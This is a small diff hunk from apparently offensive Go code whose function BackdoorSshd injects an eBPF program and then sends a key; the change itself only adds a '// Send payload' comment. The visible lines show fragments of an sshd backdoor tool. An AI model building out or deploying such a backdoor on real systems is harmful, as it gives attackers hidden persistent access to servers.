@@ -100,6 +100,7 @@ func BackdoorSshd() (err error) {
 	defer tp_exclose.Close()
 
 	log.Info("inject ebpf program into file system success")
+	// Send payload
 	err = SendKey(objs, ReadInputAsKey(stopper))
 	if err != nil {
 		log.Panicln(err)
